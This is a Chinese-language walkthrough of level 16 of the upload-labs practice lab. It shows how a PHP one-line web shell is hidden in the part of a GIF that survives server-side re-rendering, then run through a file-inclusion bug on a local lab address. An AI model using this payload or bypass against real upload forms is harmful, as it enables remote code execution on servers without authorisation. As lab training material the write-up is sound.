# upload-labs16关-详解（判断是否为照片后进行二次渲染）

 **首先看一下源码**  
![image](https://image.3001.net/images/20220711/1657528412_62cbe05c64efe6d9cb7c3.png!small)

了解函数  
imagecreatefromgif()：  
创建一块画布，并从 GIF 文件或 URL 地址载入一副图像  
imagecreatefromjpeg()：  
创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像  
imagecreatefrompng()：  
创建一块画布，并从 PNG 文件或 URL 地址载入一副图像  
imagecreatefromwbmp()：  
创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像  
imagecreatefromstring()：  
创建一块画布，并从字符串中的图像流新建一副图像

 **首先我们像前面关卡一样，上传图片马，按照我们的习惯，将会在图片的尾部，写入php一句话木马，然后用菜刀或者蚁剑连接，我们先按照此方法进行试验**

（1）上传图片马  
![image](https://image.3001.net/images/20220711/1657528432_62cbe0700a289f4a2d1da.png!small)  
（2）用burp拦截，拦截到上传的包  
![image](https://image.3001.net/images/20220711/1657528457_62cbe089cb36b37183561.png!small)

（3）在图片尾部插入一句话木马，密码是123

    
    
    <?php @eval($_POST[123]); ?>
    

![image](https://image.3001.net/images/20220711/1657528481_62cbe0a163dbbde34492c.png!small)

放包上传  
![image](https://image.3001.net/images/20220711/1657528525_62cbe0cda9004f38ebbc0.png!small)

（4）将图片地址复制下来，用菜刀连接，密码设置的是123  
![image](https://image.3001.net/images/20220711/1657528541_62cbe0ddc13abfabb3cdb.png!small)

发现连接失败  
![image](https://image.3001.net/images/20220711/1657528559_62cbe0ef6674c6f4689b2.png!small)

原因是照片上传后被渲染了

## 2\. 开始分析渲染的内容

 **首先将渲染的图片地址复制下来，我们下载到本地**

图像另存为，放到桌面，名称是2.gif，原始图片是1.gif  
![image](https://image.3001.net/images/20220711/1657528580_62cbe10443aa30a8e6116.png!small)  
 **使用hexcap进行文件十六进制对比**

## 红白区域是未被渲染的，红色区域都是已经被渲染的，观察，已经和源文件的hex值不一样了  
![image](https://image.3001.net/images/20220711/1657528613_62cbe12533c7636ed3b2a.png!small)

![image](https://image.3001.net/images/20220711/1657528627_62cbe13305e0db32ad465.png!small)

我们将一句话木马插入没有被渲染的地方，大概就是在文件前段，  
 **（注意：不要从头部插入，会破坏gif文件头，验证图片失败，上传不了）**

再次上传，并burp抓包  
![image](https://image.3001.net/images/20220711/1657528680_62cbe16831797c2110d01.png!small)

结合文件包含漏洞，使用include.php  
构成payload  
http://192.168.1.66/upload/include.php?file=upload/6169.gif  
（别忘了使用include.php包含漏洞）  
![image](https://image.3001.net/images/20220711/1657528717_62cbe18d93aa204ce241b.png!small)

成功

![image](https://image.3001.net/images/20220711/1657528736_62cbe1a014edf374a453e.png!small)

同步本人CSDN文章：

> https://blog.csdn.net/qq_44133136/article/details/109208174

